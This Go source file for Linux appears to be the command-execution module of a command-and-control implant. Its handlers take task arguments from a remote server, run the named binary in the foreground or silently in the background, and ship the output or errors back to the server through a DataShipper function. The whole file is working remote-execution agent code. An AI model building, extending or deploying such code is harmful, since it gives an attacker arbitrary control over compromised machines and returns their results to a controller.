//go:build linux

package agent_helper

import (
	"bytes"
	"os"
	"os/exec"
	"strings"
)

func ExecBgHandler(serverUrl string, taskData map[string]interface{}) {
	binary := strings.Split(taskData["args"].(string), " ")
	output, err := execBinary(binary[0], binary[1:], true)
	if err != nil {
		DataShipper(serverUrl, taskData, err.Error())
		return
	}
	DataShipper(serverUrl, taskData, output)
}

func ExecFgHandler(serverUrl string, taskData map[string]interface{}) {
	binary := strings.Split(taskData["args"].(string), " ")
	output, err := execBinary(binary[0], binary[1:], false)
	if err != nil {
		DataShipper(serverUrl, taskData, err.Error())
		return
	}
	DataShipper(serverUrl, taskData, output)
}

func execBinary(binPath string, args []string, background bool) (string, error) {
	binary := exec.Command(binPath, args...)

	var output bytes.Buffer

	if background {
		binary.Stdin = nil
		binary.Stdout, _ = os.Open(os.DevNull)
		binary.Stderr, _ = os.Open(os.DevNull)
	} else {
		binary.Stdin = nil
		binary.Stdout = &output
		binary.Stderr = &output
	}

	err := binary.Start()
	if err != nil {
		return "", err
	}

	if background {
		return "[+] Binary executed successfully in background", nil
	}

	err = binary.Wait()
	if err != nil {
		return "", err
	}

	return output.String(), nil

}
